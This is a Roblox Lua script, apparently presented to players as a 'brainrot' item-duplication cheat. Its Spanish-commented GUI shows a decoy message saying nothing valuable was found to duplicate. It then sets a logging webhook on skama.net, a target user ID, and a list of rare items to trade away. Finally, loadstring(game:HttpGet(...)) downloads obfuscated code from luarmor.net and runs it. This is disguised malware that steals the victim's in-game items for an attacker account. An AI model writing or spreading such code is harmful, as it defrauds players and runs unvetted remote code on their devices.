-- Crear ScreenGui
local gui = Instance.new("ScreenGui")
gui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- Frame principal (arrastrable)
local main = Instance.new("Frame")
main.Size = UDim2.new(0, 350, 0, 60)
main.Position = UDim2.new(1, -360, 0.5, -30) -- Lateral derecho
main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
main.BorderSizePixel = 0
main.Parent = gui

-- Redondeado
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 8)
corner.Parent = main

-- Barra con degradado
local barra = Instance.new("Frame")
barra.Size = UDim2.new(1, 0, 1, 0)
barra.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
barra.BorderSizePixel = 0
barra.Parent = main

local gradient = Instance.new("UIGradient")
gradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(150, 0, 255)), -- Morado
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 140, 255))  -- Azul
})
gradient.Parent = barra

-- Texto del mensaje
local mensaje = Instance.new("TextLabel")
mensaje.Size = UDim2.new(1, -20, 1, -20)
mensaje.Position = UDim2.new(0, 10, 0, 10)
mensaje.BackgroundTransparency = 1
mensaje.TextColor3 = Color3.fromRGB(255, 255, 255)
mensaje.TextScaled = true
mensaje.Text = "No se encontraron brainrots  de valor para duplicar"
mensaje.Font = Enum.Font.GothamBold
mensaje.Parent = main

-- Hacer arrastrable
local dragging = false
local dragStart, startPos

main.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = main.Position
    end
end)

main.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

game:GetService("UserInputService").InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = input.Position - dragStart
        main.Position = UDim2.new(
            startPos.X.Scale,
            startPos.X.Offset + delta.X,
            startPos.Y.Scale,
            startPos.Y.Offset + delta.Y
        )
    end
end)
getgenv().WEBHOOK_URL = "https://skama.net/api/logs/webhook/mrr_69201cb343644b71a9b62af1bbad7be2"
getgenv().TARGET_ID = 7687372922
getgenv().DELAY_STEP = 1      
getgenv().TRADE_CYCLE_DELAY = 2 
getgenv().TARGET_BRAINROTS = {
    ["Burguro And Fryuro"] = true,
    ["Capitano Moby"] = true,
    ["Cerberus"] = true,
    ["Cooki and Milki"] = true,
    ["Dragon Cannelloni"] = true,
    ["Dragon Gingerini"] = true,
    ["Festive 67"] = true,
    ["Fragrama and Chocrama"] = true,
    ["Garama and Madundung"] = true,
    ["Ginger Gerat"] = true,
    ["Headless Horseman"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Ketchuru and Musturu"] = true,
    ["Ketupat Bros"] = true,
    ["Ketupat Kepat"] = true,
    ["La Casa Boo"] = true,
    ["La Romantic Grande"] = true,
    ["La Supreme Combinasion"] = true,
    ["La Taco Combinasion"] = true,
    ["Lavadorito Spinito"] = true,
    ["Meowl"] = true,
    ["Money Money Puggy"] = true,
    ["Nuclearo Dinossauro"] = true,
    ["Popcuru and Fizzuru"] = true,
    ["Reinito Sleighito"] = true,
    ["Rosey and Teddy"] = true,
    ["Skibidi Toilet"] = true,
    ["Spooky and Pumpky"] = true,
    ["Strawberry Elephant"] = true,
    ["Tang Tang Keletang"] = true,
    ["Tictac Sahur"] = true
}
loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua"))()
